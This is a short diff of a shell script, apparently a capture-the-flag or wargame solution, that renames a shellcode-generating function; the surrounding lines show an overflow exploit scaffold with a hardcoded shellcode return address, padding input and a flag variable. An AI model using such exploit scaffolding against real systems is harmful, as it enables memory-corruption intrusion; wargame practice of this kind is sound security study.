@@ -21,7 +21,7 @@ log() {
 # SHELLCODE #
 # ######### #
 
-generate_exploit_shellcode() {
+generate_shellcode() {
     trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
     tmpdir=$(mktemp -d);
 
@@ -48,7 +48,7 @@ main() {
     password="${password}";
     flag="";
 
-    shellcode="$(generate_exploit_shellcode)" || { log "Error: failed to build shellcode."; return 1; };
+    shellcode="$(generate_shellcode)" || { log "Error: failed to build shellcode."; return 1; };
     shellcode_addr='\324\355\377\277';
 
     user_input_1="AAAAAAAAAAAAAAAAAAAA\n"
